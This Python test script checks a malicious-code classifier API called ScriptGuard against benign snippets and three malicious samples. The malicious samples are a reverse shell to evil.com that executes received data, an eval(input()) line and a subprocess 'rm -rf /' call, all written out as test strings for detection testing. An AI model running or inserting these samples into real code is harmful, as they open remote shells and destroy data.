"""
Test script to verify false positive fix for "print('hello world')"
Validates that the API correctly classifies benign code after the fixes.
"""

import requests
import json
import os
import sys

# Test configuration
API_URL = os.getenv("SCRIPTGUARD_API_URL", "http://localhost:8000")
API_KEY = os.getenv("SCRIPTGUARD_API_KEY", "your_key_here")

# Test cases: (code, expected_classification, description)
TEST_CASES = [
    # Benign cases (should be classified as benign)
    ("print('hello world')", "benign", "Simple hello world"),
    ("import sys\nprint(sys.version)", "benign", "System version check"),
    ("x = 42\nprint(x)", "benign", "Variable assignment and print"),
    ("def greet(name):\n    return f'Hello, {name}!'\nprint(greet('World'))", "benign", "Simple function"),
    (
        "import os\nfiles = os.listdir('.')\nfor f in files:\n    print(f)",
        "benign",
        "List directory (legitimate admin use)"
    ),

    # Malicious cases (should be classified as malicious)
    (
        "import socket\ns=socket.socket()\ns.connect(('evil.com',4444))\nexec(s.recv(1024))",
        "malicious",
        "Reverse shell"
    ),
    (
        "eval(input('code: '))",
        "malicious",
        "Arbitrary code execution"
    ),
    (
        "import subprocess\nsubprocess.call(['rm', '-rf', '/'])",
        "malicious",
        "Destructive command"
    ),
]


def analyze_script(code: str) -> dict:
    """Send code to API for analysis."""
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": API_KEY
    }

    payload = {
        "script_content": code,
        "include_rag": True
    }

    try:
        response = requests.post(
            f"{API_URL}/analyze",
            headers=headers,
            json=payload,
            timeout=30
        )
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"❌ API request failed: {e}")
        return None


def main():
    """Run all test cases and report results."""
    print("=" * 80)
    print("ScriptGuard False Positive Fix Verification")
    print("=" * 80)
    print()

    # Check API connectivity
    print(f"Testing API endpoint: {API_URL}")
    try:
        health_response = requests.get(f"{API_URL}/health", timeout=5)
        if health_response.status_code == 200:
            print("✅ API is reachable")
        else:
            print(f"❌ API health check failed: {health_response.status_code}")
            return
    except Exception as e:
        print(f"❌ Cannot connect to API: {e}")
        print("\nMake sure the API is running:")
        print("  python -m scriptguard.api.main")
        return

    print()
    print("-" * 80)
    print("Running test cases...")
    print("-" * 80)
    print()

    passed = 0
    failed = 0
    errors = 0

    for i, (code, expected, description) in enumerate(TEST_CASES, 1):
        print(f"Test {i}/{len(TEST_CASES)}: {description}")
        print(f"Code: {code[:50]}{'...' if len(code) > 50 else ''}")

        result = analyze_script(code)

        if result is None:
            print(f"  ❌ ERROR: API request failed")
            errors += 1
            print()
            continue

        is_malicious = result.get("is_malicious", None)
        confidence = result.get("confidence", 0.0)

        # Determine actual classification
        actual = "malicious" if is_malicious else "benign"

        # Check if test passed
        if actual == expected:
            print(f"  ✅ PASS: Classified as {actual} (confidence: {confidence:.3f})")
            passed += 1
        else:
            print(f"  ❌ FAIL: Expected {expected}, got {actual} (confidence: {confidence:.3f})")
            failed += 1

        # Display RAG context if available
        related_cves = result.get("related_cves", [])
        if related_cves:
            print(f"  RAG: Retrieved {len(related_cves)} similar examples")
            for cve in related_cves[:2]:  # Show first 2
                print(f"    - {cve.get('description', 'N/A')[:60]}... (score: {cve.get('score', 0):.3f})")

        print()

    # Summary
    print("=" * 80)
    print("Test Summary")
    print("=" * 80)
    print(f"Total tests: {len(TEST_CASES)}")
    print(f"✅ Passed: {passed}")
    print(f"❌ Failed: {failed}")
    print(f"⚠️  Errors: {errors}")
    print()

    if failed == 0 and errors == 0:
        print("🎉 All tests passed! False positive fix is working correctly.")
        return 0
    else:
        print("⚠️  Some tests failed. Review the output above for details.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
